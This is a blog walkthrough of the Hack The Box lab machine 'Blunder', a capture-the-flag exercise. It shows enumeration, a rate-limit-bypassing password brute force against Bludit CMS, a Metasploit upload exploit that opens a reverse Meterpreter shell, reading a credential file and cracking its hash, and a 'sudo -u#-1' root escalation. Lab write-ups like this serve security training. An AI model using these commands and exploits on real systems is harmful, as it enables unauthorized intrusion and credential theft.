---
layout: post
title:  "Blunder Hack The Box Walkthrough"
date:   2020-09-28 15:00:00 +0530
categories: HackTheBox HTB CTF
---
Blunder is a machine in which I used an enumration and a multiple cms exploits to get a shell and then enumeration and another exploit to get root Access.

## Scanning
As always, I started scanning with Nmap

```
root@kali:/home/kali# nmap -sC -sV 10.10.10.191
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 10:15 EDT
Nmap scan report for blunder.htb (10.10.10.191)
Host is up (0.16s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.15 seconds

```
Http open and ftp closed. 
## Directory Enumeration
Then I enumerated directories and files using gobuster

```
root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u blunder.htb -e txt,php,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://blunder.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/09/29 10:16:49 Starting gobuster
===============================================================                                                   
http://blunder.htb/about (Status: 200)
http://blunder.htb/0 (Status: 200)
http://blunder.htb/admin (Status: 301)
http://blunder.htb/usb (Status: 200)
http://blunder.htb/LICENSE (Status: 200)
```
Found admin directory which contains a login page. then used wfuzz to enumerate directories

```
kali@kali:~$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 http://10.10.10.191/FUZZ.txt

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.191/FUZZ.txt
Total requests: 4658

===================================================================
ID           Response   Lines    Word     Chars       Payload                                          
===================================================================

000003519:   200        1 L      4 W      22 Ch       "robots"                                         
000004125:   200        4 L      23 W     118 Ch      "todo"                                           

Total time: 220.7807
Processed Requests: 4658
Filtered Requests: 4656
Requests/sec.: 21.09785

```

Found todo.txt so I opened it and found a user called fergus

```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

## Bruteforce
The Login Page It contains rate limit so I searched for an exploit to bypass Rate limit and found [Exploit](https://raw.githubusercontent.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/master/bruteforce.py) 

If you tried the rockyou list it won't work so I used cewl

```
cewl http://10.10.10.191
```

then used the exploit

```
kali@kali:~/Desktop/blunder2$ python exploit.py 10.10.10.191 fergus wordlist 
[*] Trying: CeWL 5.4.7 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
[*] Trying: the
....
[*] Trying: RolandDeschain
()
SUCCESS: Password found!
Use fergus:RolandDeschain to login.

```
## Exploit
I searched for an exploits for bludit in metasploit and found one
```
msf5 > use exploit/linux/http/bludit_upload_images_exec 
msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191
RHOSTS => 10.10.10.191
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf5 exploit(linux/http/bludit_upload_images_exec) > exploit 

[*] Started reverse TCP handler on 10.10.14.110:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading ZNhMscEKTp.png...
[*] Uploading .htaccess...
[*] Executing ZNhMscEKTp.png...
[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (10.10.14.110:4444 -> 10.10.10.191:41004) at 2020-09-29 10:31:07 -0400

```

## From Web to Hugo
I started enumeration and found an interesting credentials in

```
cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

So, I started cracking the hash 
![Username](/assets/image/007/1.png)

then started su to hugo

```
su hugo              
Password: Password120
whoami
hugo
```
Then tried to try sudo -l

```
python -c 'import pty; pty.spawn("/bin/bash")'
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

I tried to bypass the this sudo permissions to run /bin/bash using this [Exploit](https://www.exploit-db.com/exploits/47502)

```
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash
<-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash       
root@blunder:/var/www/bludit-3.10.0a/bl-content/databases#  

```

and voila here is the root privilege!